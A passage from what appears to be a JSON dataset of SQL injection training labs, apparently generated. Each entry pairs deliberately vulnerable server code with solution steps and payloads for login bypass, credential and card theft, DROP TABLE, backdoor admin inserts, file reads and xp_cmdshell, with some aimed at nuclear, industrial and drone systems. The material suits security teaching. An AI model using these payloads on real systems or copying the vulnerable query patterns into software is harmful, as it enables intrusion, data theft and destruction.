    "srcCode": "app.post('/verify-mfa-device', (req, res) => {\n  const { deviceId } = req.body;\n  const query = `SELECT * FROM mfa_devices WHERE device_id = '${deviceId}'`;\n  db.query(query, (err, results) => {\n    if (results.rows.length) {\n      return res.json({ verified: true });\n    }\n    res.json({ verified: false });\n  });\n});",
    "payloads": [
      "deviceId' AND SUBSTRING((SELECT mfa_seed FROM users WHERE username='admin'),1,1)='A'--",
      "test' AND (SELECT COUNT(*) FROM users WHERE mfa_seed LIKE 'A%')>0--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Legal Document Search Engine",
    "Lab Description": "A legal research platform's document search functionality directly embeds user-controlled highlight markers into SQL full-text search queries. The application uses a custom highlighting syntax that can be abused to break out of the text search context. To solve: Exploit the highlight parameter injection to perform a UNION-based attack extracting all legal documents, including privileged client communications and sealed court records.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify vulnerable highlight parameter in document search",
      "Break highlighting syntax with: <mark>')) UNION SELECT doc_content,null FROM legal_documents--</mark>",
      "Extract sensitive legal documents through incremental queries",
      "Identify privileged documents through metadata injection",
      "Document unauthorized access to sealed records"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/search-documents', (req, res) => {\n  const { q, highlight } = req.query;\n  const query = `SELECT id, ts_headline(content, q, '${highlight}') FROM documents WHERE content @@ to_tsquery('${q}')`;\n  db.query(query, (err, results) => {\n    res.json(results.rows);\n  });\n});",
    "payloads": [
      "<mark>')) UNION SELECT doc_content,null FROM legal_documents--</mark>",
      "<mark>')) UNION SELECT client_name,case_details FROM privileged_docs--</mark>"
    ]
  },
  {
    "Lab scenario": "Error-based SQL Injection in Product Filter of an E-commerce Site",
    "Lab Description": "The product filter endpoint accepts a category ID parameter that is directly concatenated into a SQL query without sanitization. The application displays full MySQL error messages, enabling error-based injection techniques. This vulnerability allows attackers to extract database schema information and sensitive data through carefully crafted error messages. The exploit leverages MySQL's XML functions to force error messages containing query results.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify the vulnerable category parameter in /products?category=1",
      "Inject payload using extractvalue(): 1' AND extractvalue(1, concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)))--",
      "Analyze error message to extract the first table name",
      "Iterate through tables by adjusting the LIMIT offset",
      "Extract column names from information_schema.columns for identified tables"
    ],
    "Vulnerability name": "Error-based SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/products', (req, res) => {\n  const cat = req.query.category;\n  const query = `SELECT id, name, price FROM products WHERE category_id = '${cat}'`;\n  db.query(query, (err, result) => {\n    if (err) return res.status(500).send(err.message);\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "1' AND extractvalue(1, concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)))--",
      "1' AND updatexml(null, concat(0x3a,(SELECT database())), null)--"
    ]
  },
  {
    "Lab scenario": "Second-order SQL Injection in User Profile Update",
    "Lab Description": "The application stores user profile status messages without proper sanitization, then later uses them unsafely in admin dashboard queries. This delayed exploitation vector demonstrates how initially 'safe' stored data can become dangerous when reused in different contexts. The attack requires storing malicious input that only triggers when processed by vulnerable code paths, typically through admin functionality with higher privileges.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Authenticate as a regular user and navigate to profile settings",
      "Set status message to: '; DROP TABLE audit_logs--",
      "Confirm the status saves without immediate errors",
      "Wait for admin user to access the dashboard (or simulate this access)",
      "Verify the audit_logs table was dropped through error messages"
    ],
    "Vulnerability name": "Second-order SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\n// Vulnerable update handler\napp.post('/profile/status', (req, res) => {\n  const { status } = req.body;\n  const query = `UPDATE users SET status = '${status}' WHERE id = ${req.user.id}`;\n  db.query(query);\n  res.send('Status updated');\n});\n\n// Vulnerable admin dashboard\napp.get('/admin/dashboard', (req, res) => {\n  const query = `SELECT u.id, u.status, a.action FROM users u LEFT JOIN audit_logs a ON u.id = a.user_id WHERE u.status LIKE '%active%'`;\n  db.query(query, (err, results) => {\n    if (err) return res.status(500).send(err.message);\n    res.render('dashboard', { users: results.rows });\n  });\n});",
    "payloads": [
      "'; DROP TABLE audit_logs--",
      "active'; INSERT INTO admin_users (username) VALUES ('hacker');--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in DELETE Statement of Admin Panel",
    "Lab Description": "The user management interface contains a critical vulnerability where user IDs are directly interpolated into DELETE statements. This flaw allows attackers to manipulate query logic to delete arbitrary data. Unlike SELECT injections, DELETE vulnerabilities can cause irreversible data loss. The attack demonstrates how missing parameterization in write operations can be more dangerous than in read operations.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify the user deletion endpoint at /admin/users/delete?id=5",
      "Test with payload: 5 OR 1=1-- to delete all users",
      "Verify mass deletion through login attempts",
      "Escalate with stacked queries: 0; DROP TABLE transactions--",
      "Confirm database damage through application errors"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.delete('/admin/users', (req, res) => {\n  const id = req.query.id;\n  const query = `DELETE FROM users WHERE id = ${id}`;\n  db.query(query, (err) => {\n    if (err) return res.status(500).send(err.message);\n    res.send('User deleted');\n  });\n});",
    "payloads": [
      "5 OR 1=1--",
      "0; DROP TABLE transactions--",
      "1; UPDATE users SET is_admin=1 WHERE id=100--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Mobile App's Search API",
    "Lab Description": "The mobile backend API accepts search terms through POST requests and concatenates them directly into a LIKE clause. This vulnerability demonstrates how APIs powering mobile apps can be vulnerable to classic injection attacks. The LIKE operator context requires different syntax than WHERE clause injections, showing how injection techniques must adapt to query contexts.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept mobile app traffic to /api/v1/search",
      "Modify JSON payload: {\"query\":\"a%' OR '1'='1\"}",
      "Observe unfiltered results showing injection success",
      "Extract data: {\"query\":\"x%' UNION SELECT username, password FROM users--\"}",
      "Document compromised credentials"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\napp.post('/api/v1/search', (req, res) => {\n  const term = req.body.query;\n  const query = `SELECT id, title FROM articles WHERE title LIKE '%${term}%' LIMIT 20`;\n  db.query(query, (err, results) => {\n    res.json(results.rows);\n  });\n});",
    "payloads": [
      "a%' OR '1'='1",
      "x%' UNION SELECT username, password FROM users--",
      "%' AND 1=CONVERT(int,(SELECT table_name FROM information_schema.tables))--"
    ]
  },
  {
    "Lab scenario": "Login Bypass in Legacy ASP.NET Web Form",
    "Lab Description": "A classic ASP.NET authentication form demonstrates how string concatenation in SQL queries creates injection vulnerabilities. This lab highlights risks in legacy systems that haven't adopted parameterized queries. The attack bypasses authentication by manipulating the query logic to always evaluate as true, regardless of credentials.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Navigate to /login.aspx and view page source",
      "Identify username/password field names",
      "Submit username: admin'-- with any password",
      "Observe successful authentication",
      "Access restricted admin functionality"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "protected void Login_Click(object sender, EventArgs e)\n{\n    string user = txtUser.Text;\n    string pass = txtPass.Text;\n    string sql = \"SELECT * FROM users WHERE username='\" + user + \"' AND password='\" + pass + \"'\";\n    SqlCommand cmd = new SqlCommand(sql, connection);\n    // ... authentication logic\n}",
    "payloads": [
      "admin'--",
      "' OR '1'='1",
      "' OR 1=1--",
      "admin'/*"
    ]
  },
  {
    "Lab scenario": "SQL Injection in JOIN Clause of Financial Report",
    "Lab Description": "A financial reporting system builds dynamic JOIN conditions using user input, creating a rare but dangerous injection point. Most SQLi training focuses on WHERE clauses, but this lab demonstrates JOIN clause vulnerabilities that can expose sensitive relationships between tables. The attack reveals how injection points can exist in less obvious query parts.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Access the account report at /reports/account?join_on=user_id",
      "Identify the JOIN clause injection point",
      "Inject: user_id UNION SELECT account_numbers, balances FROM sensitive_accounts--",
      "Observe confidential financial data in report output",
      "Exfiltrate complete account mapping relationships"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/reports/account', (req, res) => {\n  const joinOn = req.query.join_on || 'user_id';\n  const query = `SELECT a.*, t.amount FROM accounts a JOIN transactions t ON a.${joinOn} = t.user_id`;\n  db.query(query, (err, results) => {\n    res.json(results.rows);\n  });\n});",
    "payloads": [
      "user_id UNION SELECT account_numbers, balances FROM sensitive_accounts--",
      "1=1 UNION ALL SELECT * FROM internal_audit_logs--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in XML SOAP Web Service",
    "Lab Description": "A SOAP-based web service processes XML requests where parameters are directly embedded into SQL queries. This lab demonstrates how web services using XML payloads can still be vulnerable to classic injection attacks if input sanitization is neglected. The attack requires proper XML formatting while injecting malicious SQL fragments.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture a legitimate SOAP request for GetUserDetails",
      "Modify the <UserID> element: <UserID>1 OR 1=1--</UserID>",
      "Observe extended dataset in SOAP response",
      "Inject: <UserID>1 UNION SELECT username, password FROM users--</UserID>",
      "Extract credentials from the structured response"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "// SOAP handler pseudocode\nfunction getUserDetails($xml) {\n  $userId = $xml->Body->GetUserDetails->UserID;\n  $query = \"SELECT name, email FROM users WHERE id = $userId\";\n  $result = dbQuery($query);\n  // ... format SOAP response\n}",
    "payloads": [
      "<UserID>1 OR 1=1--</UserID>",
      "<UserID>1 UNION SELECT username, password FROM users--</UserID>",
      "<UserID>1; EXEC xp_cmdshell('net user')--</UserID>"
    ]
  },
  {
    "Lab scenario": "Cookie-based SQL Injection in Shopping Cart",
    "Lab Description": "The application uses a cookie value to track shopping carts, embedding it directly into SQL queries. This lab shows how injection vulnerabilities can exist outside typical form inputs, requiring attackers to manipulate less obvious input vectors. The attack demonstrates cookie manipulation techniques and header-based injection.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify the cartId cookie in application requests",
      "Modify cookie value to: 123 OR 1=1--",
      "Observe other users' cart contents in response",
      "Inject: 123 UNION SELECT credit_card, expiry FROM payments--",
      "Verify extraction of sensitive payment data"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/api/cart', (req, res) => {\n  const cartId = req.cookies['cartId'];\n  const query = `SELECT * FROM cart_items WHERE cart_id = ${cartId}`;\n  db.query(query, (err, results) => {\n    res.json(results.rows);\n  });\n});",
    "payloads": [
      "123 OR 1=1--",
      "123 UNION SELECT credit_card, expiry FROM payments--",
      "1; INSERT INTO cart_items (cart_id, product_id) VALUES (999, 1)--"
    ]
  },
  {
    "Lab scenario": "JSON API SQL Injection in Project Management Tool",
    "Lab Description": "A modern project management application's JSON API fails to sanitize numeric IDs used in queries. This lab demonstrates how RESTful APIs using JSON payloads can still be vulnerable if server-side validation is insufficient. The attack requires proper JSON formatting while injecting malicious SQL through numeric parameters.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a legitimate project fetch request",
      "Modify JSON payload: {\"projectId\": \"1 OR 1=1\"}",
      "Observe all projects returned in the API response",
      "Inject: {\"projectId\": \"1 UNION SELECT api_key, secret FROM integrations--\"}",
      "Extract sensitive integration credentials"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/api/projects/fetch', (req, res) => {\n  const projectId = req.body.projectId;\n  const query = `SELECT * FROM projects WHERE id = ${projectId}`;\n  db.query(query, (err, results) => {\n    res.json(results.rows);\n  });\n});",
    "payloads": [
      "1 OR 1=1",
      "1 UNION SELECT api_key, secret FROM integrations--",
      "1; UPDATE projects SET is_public=1 WHERE id=100--"
    ]
  },
  {
    "Lab scenario": "LIMIT Clause SQL Injection in Data Export",
    "Lab Description": "A data export feature allows pagination through LIMIT and OFFSET parameters that are concatenated directly into queries. This lab demonstrates injection in less common query clauses, requiring specialized syntax. The attack shows how pagination controls can become injection vectors when improperly implemented.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify the export endpoint at /export?limit=10&offset=0",
      "Inject into LIMIT: limit=1 UNION SELECT username, password FROM users--",
      "Bypass with time-based technique: offset=0 LIMIT IF(SUBSTRING(database(),1,1)='a',1,0)--",
      "Exfiltrate data through timing differences",
      "Automate extraction with binary search approach"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/export', (req, res) => {\n  const limit = req.query.limit || 100;\n  const offset = req.query.offset || 0;\n  const query = `SELECT * FROM data LIMIT ${limit} OFFSET ${offset}`;\n  db.query(query, (err, results) => {\n    res.csv(results.rows);\n  });\n});",
    "payloads": [
      "1 UNION SELECT username, password FROM users--",
      "0,1 PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x3a,@@version)),1)--",
      "IF(SUBSTRING(database(),1,1)='a',1,0)"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Smart Home Voice Command Logging",
    "Lab Description": "A smart home system logs voice commands in a MySQL database. The command processing endpoint directly embeds transcribed text into INSERT statements without sanitization. The application uses a custom NLP preprocessing function that can be abused to break out of string context. To solve: Exploit the voice transcription parameter to perform a stacked query attack that extracts all voice command history and modifies device access permissions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept voice command logging request",
      "Identify vulnerable transcription parameter",
      "Break string context with: '); DROP TABLE voice_logs--",
      "Extract sensitive commands: '); SELECT * FROM voice_logs WHERE user_id=1--",
      "Modify device permissions through stacked queries"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/log-command', (req, res) => {\n  const { userId, transcription } = req.body;\n  const query = `INSERT INTO voice_logs (user_id, command) VALUES (${userId}, '${transcription}')`;\n  db.query(query, (err) => {\n    res.send('Command logged');\n  });\n});",
    "payloads": [
      "'); SELECT * FROM voice_logs WHERE user_id=1--",
      "'); UPDATE devices SET locked=0 WHERE device_type='door'--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Autonomous Vehicle Route Planning",
    "Lab Description": "An autonomous vehicle system stores route coordinates in a PostgreSQL database. The route optimization endpoint uses unsanitized location names in spatial queries. The application's custom pathfinding function can be exploited to break out of the geography context. To solve: Inject malicious SQL through the waypoint name parameter to access all vehicle routes and modify navigation rules to create dangerous driving conditions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept route planning API request",
      "Identify vulnerable waypoint name parameter",
      "Break geography context with: '); SELECT pg_read_file('/etc/passwd')--",
      "Extract all vehicle routes through UNION injection",
      "Modify safety parameters in navigation_rules table"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/plan-route', (req, res) => {\n  const { waypoints } = req.body;\n  const query = `SELECT ST_ShortestPath('${waypoints.join(\"','\")}')`;\n  db.query(query, (err, results) => {\n    res.json(results.rows[0].path);\n  });\n});",
    "payloads": [
      "'); SELECT * FROM vehicle_routes--",
      "'); UPDATE navigation_rules SET min_safe_distance=0 WHERE rule_id=1--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Industrial Control System Alarm Configuration",
    "Lab Description": "An industrial control system stores alarm thresholds in a SQLite database. The alarm configuration endpoint directly embeds parameter names and values into UPDATE statements. The application's custom validation logic can be bypassed through carefully crafted parameter names. To solve: Exploit the parameter name field to perform a UNION-based attack extracting all system configurations and modifying critical safety thresholds.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept alarm configuration update request",
      "Identify vulnerable parameter name field",
      "Break UPDATE context with: sensor_name='temp' WHERE 1=1; INSERT INTO backdoor VALUES('attack')--",
      "Extract all alarm configurations through stacked queries",
      "Modify critical safety thresholds to dangerous levels"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/configure-alarm', (req, res) => {\n  const { param, value } = req.body;\n  const query = `UPDATE alarms SET ${param} = ${value} WHERE system_id=1`;\n  db.execute(query, (err) => {\n    res.send('Alarm configured');\n  });\n});",
    "payloads": [
      "sensor_name='temp' WHERE 1=1; SELECT * FROM alarm_configs--",
      "threshold=100 WHERE 1=1; UPDATE safety_limits SET max_pressure=9999--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Blockchain Transaction Processor",
    "Lab Description": "A blockchain analytics platform stores transaction metadata in a PostgreSQL database. The transaction search endpoint directly embeds user-controlled wallet addresses into JSON-path queries. The application's custom JSON processing function can be exploited to break out of the path context. To solve: Inject malicious SQL through the wallet address parameter to access all transaction histories and modify verification flags.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept transaction search request",
      "Identify vulnerable wallet address parameter",
      "Break JSON-path context with: ']'::jsonb) UNION SELECT * FROM private_transactions--",
      "Extract all wallet balances through stacked queries",
      "Modify transaction verification statuses"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/search-transactions', (req, res) => {\n  const { wallet } = req.query;\n  const query = `SELECT * FROM txns WHERE metadata @> '{\"address\":\"${wallet}\"}'::jsonb`;\n  db.query(query, (err, results) => {\n    res.json(results.rows);\n  });\n});",
    "payloads": [
      "'}'::jsonb) UNION SELECT * FROM private_transactions--",
      "'}'::jsonb); UPDATE txns SET verified=true WHERE amount>10000--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in AI Chatbot Training Data System",
    "Lab Description": "An AI chatbot platform stores training conversations in a MySQL database. The data labeling endpoint directly embeds category names into INSERT statements. The application's custom NLP tagging function can be abused to break out of string context. To solve: Exploit the category parameter to perform a stacked query attack extracting all training conversations and injecting malicious training examples.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept data labeling API request",
      "Identify vulnerable category parameter",
      "Break string context with: '); SELECT * FROM training_data--",
      "Extract sensitive conversations containing PII",
      "Inject biased training examples through stacked queries"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/label-data', (req, res) => {\n  const { conversationId, category } = req.body;\n  const query = `UPDATE training_data SET category='${category}' WHERE id=${conversationId}`;\n  db.query(query, (err) => {\n    res.send('Data labeled');\n  });\n});",
    "payloads": [
      "'); SELECT * FROM training_data WHERE category='private'--",
      "'); INSERT INTO training_data VALUES (9999,'injected','Learn bad words')--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Quantum Computing Job Scheduler",
    "Lab Description": "A quantum computing platform stores job parameters in a PostgreSQL database. The job submission endpoint directly embeds algorithm names into queries. The application's custom quantum circuit compiler can be exploited to break out of string context. To solve: Inject malicious SQL through the algorithm name parameter to access all job histories and modify sensitive quantum processor configurations.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept job submission request",
      "Identify vulnerable algorithm name parameter",
      "Break string context with: '); SELECT * FROM quantum_jobs--",
      "Extract proprietary quantum algorithms",
      "Modify processor calibration settings"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/submit-job', (req, res) => {\n  const { algorithm, parameters } = req.body;\n  const query = `INSERT INTO jobs (algorithm, params) VALUES ('${algorithm}', '${parameters}')`;\n  db.query(query, (err) => {\n    res.send('Job submitted');\n  });\n});",
    "payloads": [
      "'); SELECT * FROM quantum_processor_configs--",
      "'); UPDATE processor_settings SET error_correction=0 WHERE qubit_count>5--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Satellite Telemetry System",
    "Lab Description": "A satellite ground station stores telemetry data in a SQLite database. The data retrieval endpoint directly embeds sensor names into queries. The application's custom signal processing function can be abused to break out of string context. To solve: Exploit the sensor name parameter to perform a UNION-based attack extracting all telemetry data and modifying satellite control parameters.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept telemetry data request",
      "Identify vulnerable sensor name parameter",
      "Break string context with: ' UNION SELECT * FROM command_history--",
      "Extract sensitive orbit and positioning data",
      "Modify thruster control parameters"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/telemetry', (req, res) => {\n  const { sensor } = req.query;\n  const query = `SELECT timestamp, value FROM telemetry WHERE sensor='${sensor}'`;\n  db.query(query, (err, results) => {\n    res.json(results.rows);\n  });\n});",
    "payloads": [
      "' UNION SELECT command, parameters FROM satellite_commands--",
      "'; UPDATE thruster_settings SET firing_duration=5000 WHERE thruster_id=1--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in DNA Sequencing Analysis Platform",
    "Lab Description": "A bioinformatics platform stores DNA sequence metadata in a PostgreSQL database. The sequence search endpoint directly embeds genetic marker patterns into similarity queries. The application's custom pattern matching function can be exploited to break out of the sequence context. To solve: Inject malicious SQL through the genetic marker parameter to access all DNA sequence records and modify research findings.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept sequence search request",
      "Identify vulnerable genetic marker parameter",
      "Break pattern context with: ') UNION SELECT * FROM patient_dna--",
      "Extract sensitive genetic data containing health information",
      "Modify research conclusions in published findings"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/search-sequences', (req, res) => {\n  const { marker } = req.body;\n  const query = `SELECT * FROM sequences WHERE similarity(sequence, '${marker}') > 0.9`;\n  db.query(query, (err, results) => {\n    res.json(results.rows);\n  });\n});",
    "payloads": [
      "') UNION SELECT * FROM genetic_research_data--",
      "'); UPDATE research_papers SET conclusion='Harmless' WHERE disease='Cancer'--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Military Drone Command System",
    "Lab Description": "A drone command system stores mission parameters in an encrypted SQLite database. The command verification endpoint directly embeds parameter names into queries after decryption. The application's custom crypto layer can be bypassed through carefully crafted command sequences. To solve: Exploit the decrypted parameter field to perform a stacked query attack extracting all mission plans and modifying drone flight paths.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept encrypted command transmission",
      "Decrypt and identify vulnerable parameter field",
      "Break query context with: '; SELECT * FROM classified_missions--",
      "Extract sensitive mission coordinates and objectives",
      "Modify drone navigation waypoints"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/verify-command', (req, res) => {\n  const { encryptedCmd } = req.body;\n  const decrypted = decrypt(encryptedCmd);\n  const query = `UPDATE drone_commands SET verified=1 WHERE command='${decrypted}'`;\n  db.query(query, (err) => {\n    res.send('Command verified');\n  });\n});",
    "payloads": [
      "'; SELECT * FROM navigation_waypoints--",
      "'; UPDATE drone_paths SET coordinates='dangerous_location' WHERE mission_id=1--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Nuclear Plant Sensor Monitoring",
    "Lab Description": "A nuclear power plant monitoring system stores sensor readings in a firewalled PostgreSQL database. The sensor data visualization endpoint directly embeds time range parameters into queries. The application's custom time series function can be exploited to break out of the timestamp context. To solve: Inject malicious SQL through the time range parameter to access all sensor histories and modify critical safety thresholds.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept sensor data request",
      "Identify vulnerable time range parameter",
      "Break timestamp context with: ')) UNION SELECT * FROM safety_override_logs--",
      "Extract sensitive operational data",
      "Modify reactor temperature safety limits"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/sensor-data', (req, res) => {\n  const { sensorId, start, end } = req.query;\n  const query = `SELECT * FROM readings WHERE sensor_id=${sensorId} AND time BETWEEN ('${start}' AND '${end}')`;\n  db.query(query, (err, results) => {\n    res.json(results.rows);\n  });\n});",
    "payloads": [
      "')) UNION SELECT * FROM reactor_core_parameters--",
      "')); UPDATE safety_limits SET max_temperature=2000 WHERE zone='core'--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in HR System DELETE Operation",
    "Lab Description": "An HR management system's employee deletion endpoint constructs DELETE queries directly from user input. The vulnerable parameter allows attackers to manipulate the query to delete arbitrary records. This lab demonstrates the impact of unsanitized input in DELETE operations, where injection can lead to mass data destruction.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the DELETE request to /employee endpoint",
      "Identify the vulnerable emp_id parameter",
      "Inject payload: 101 OR 1=1-- to delete all records",
      "Verify deletion by checking employee count",
      "Attempt more destructive payloads like DROP TABLE"
    ],
    "Vulnerability name": "SQL Injection in DELETE Operation",
    "srcCode": "app.delete('/employee', (req, res) => {\n  const emp_id = req.query.emp_id;\n  const query = `DELETE FROM employees WHERE emp_id = ${emp_id}`;\n  db.run(query);\n  res.send('Employee deleted');\n});",
    "payloads": [
      "101 OR 1=1--",
      "105; DROP TABLE employees--",
      "0; INSERT INTO backdoor VALUES('attacker')--"
    ]
  },
  {
    "Lab scenario": "Second-Order SQL Injection in User Profiles",
    "Lab Description": "A profile update system stores unsanitized user input that gets embedded into SQL queries during admin review. This delayed execution demonstrates second-order injection where payloads remain dormant until triggered by privileged users. The challenge involves storing malicious SQL in a bio field that executes during admin access.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Update profile with malicious bio: ', admin'--",
      "Wait for admin to review the profile",
      "Observe altered admin query behavior",
      "Escalate to full database compromise",
      "Document the delayed execution chain"
    ],
    "Vulnerability name": "Second-Order SQL Injection",
    "srcCode": "app.post('/updateProfile', (req, res) => {\n  const { bio } = req.body;\n  const query = `UPDATE users SET bio = '${bio}' WHERE username = '${req.user}'`;\n  db.run(query);\n  res.send('Profile updated');\n});\n\napp.get('/admin/review', (req, res) => {\n  const query = `SELECT * FROM users WHERE username = '${req.query.user}'`;\n  db.get(query, (err, row) => res.json(row));\n});",
    "payloads": [
      "', admin'--",
      "'; UPDATE users SET is_admin=1 WHERE username='attacker'--"
    ]
  },
  {
    "Lab scenario": "Stored Procedure Injection in Password Recovery",
    "Lab Description": "A password recovery system uses a vulnerable stored procedure that concatenates user input directly into dynamic SQL. This lab demonstrates how injection can occur even when using stored procedures if input sanitization is neglected. The challenge involves exploiting the email parameter to extract password hashes.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit malicious email in recovery form: admin'--",
      "Intercept the stored procedure execution",
      "Extract password hashes via UNION injection",
      "Bypass authentication using extracted credentials",
      "Document the procedure vulnerability"
    ],
    "Vulnerability name": "SQL Injection in Stored Procedure",
    "srcCode": "CREATE PROCEDURE recover_password(IN user_email VARCHAR(100))\nBEGIN\n  SET @query = CONCAT('SELECT password FROM users WHERE email = ''', user_email, '''');\n  PREPARE stmt FROM @query;\n  EXECUTE stmt;\nEND;//",
    "payloads": [
      "admin'--",
      "nonexistent@x.com' UNION SELECT password FROM users--"
    ]
  },
  {
    "Lab scenario": "Metadata Injection in Image Gallery",
    "Lab Description": "An image gallery system incorporates unsanitized user input from image captions into SQL queries. This lab demonstrates injection through secondary input channels like file metadata. The challenge involves exploiting the caption field to exfiltrate user credentials via the gallery display.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Upload image with malicious caption",
      "Payload: ', (SELECT GROUP_CONCAT(username,password) FROM users)--",
      "Trigger gallery display of the image",
      "Observe credential leakage in metadata",
      "Document the indirect injection vector"
    ],
    "Vulnerability name": "SQL Injection via Metadata",
    "srcCode": "app.post('/upload', (req, res) => {\n  const { caption } = req.body;\n  const query = `INSERT INTO gallery (caption) VALUES ('${caption}')`;\n  db.run(query);\n  res.redirect('/gallery');\n});",
    "payloads": [
      "', (SELECT GROUP_CONCAT(username,password) FROM users)--",
      "', (SELECT LOAD_FILE('/etc/passwd'))--"
    ]
  },
  {
    "Lab scenario": "XML-Based SQL Injection in Search API",
    "Lab Description": "A search API returns results in XML format but constructs queries through string concatenation. This lab demonstrates how injection can persist even with output format constraints. The challenge involves exploiting the search parameter to extract database schema via XML responses.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Inject into search parameter: test' UNION SELECT table_name,null FROM information_schema.tables--",
      "Parse the XML response for schema information",
      "Extract column metadata through follow-up queries",
      "Map complete database structure",
      "Document the XML-based exfiltration"
    ],
    "Vulnerability name": "SQL Injection with XML Output",
    "srcCode": "app.get('/search.xml', (req, res) => {\n  const q = req.query.q;\n  const query = `SELECT title, content FROM articles WHERE title LIKE '%${q}%'`;\n  db.all(query, (err, rows) => {\n    res.type('xml').send(`<results>${rows.map(r => `<item><title>${r.title}</title></item>`).join('')}</results>`);\n  });\n});",
    "payloads": [
      "test' UNION SELECT table_name,null FROM information_schema.tables--",
      "' UNION SELECT version(),null--"
    ]
  },
  {
    "Lab scenario": "Chart Data Injection in Financial Dashboard",
    "Lab Description": "A financial dashboard dynamically builds SQL queries from unsanitized user input to generate charts. This lab demonstrates injection through data visualization parameters. The challenge involves manipulating chart metrics to expose sensitive transaction records in tooltip data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Inject into metric parameter: revenue' UNION SELECT credit_card FROM transactions--",
      "Observe sensitive data in chart tooltips",
      "Extract complete transaction records",
      "Bypass chart rendering limitations",
      "Document the visualization attack vector"
    ],
    "Vulnerability name": "SQL Injection in Data Visualization",
    "srcCode": "app.get('/chart', (req, res) => {\n  const { metric } = req.query;\n  const query = `SELECT ${metric} FROM financial_data`;\n  db.all(query, (err, rows) => res.json(rows));\n});",
    "payloads": [
      "revenue' UNION SELECT credit_card FROM transactions--",
      "ROUND(amount,2) FROM (SELECT * FROM sensitive_transactions) AS x--"
    ]
  },
  {
    "Lab scenario": "JSON API Authentication Bypass",
    "Lab Description": "A mobile API accepts JSON credentials but embeds them directly into SQL queries. This lab demonstrates injection through JSON payloads with proper content-type headers. The challenge involves bypassing authentication using boolean-based payloads in the username field.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Send JSON payload: {\"username\":\"admin'--\",\"password\":\"any\"}",
      "Observe successful authentication bypass",
      "Extract session tokens",
      "Access privileged endpoints",
      "Document the JSON injection vector"
    ],
    "Vulnerability name": "SQL Injection in JSON API",
    "srcCode": "app.post('/api/login', express.json(), (req, res) => {\n  const { username, password } = req.body;\n  const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;\n  db.get(query, (err, user) => {\n    if (user) res.json({ token: user.token });\n    else res.sendStatus(401);\n  });\n});",
    "payloads": [
      "admin'--",
      "' OR '1'='1'--",
      "' UNION SELECT 1,'admin','hashed_pass',1--"
    ]
  },
  {
    "Lab scenario": "CSV Export Injection",
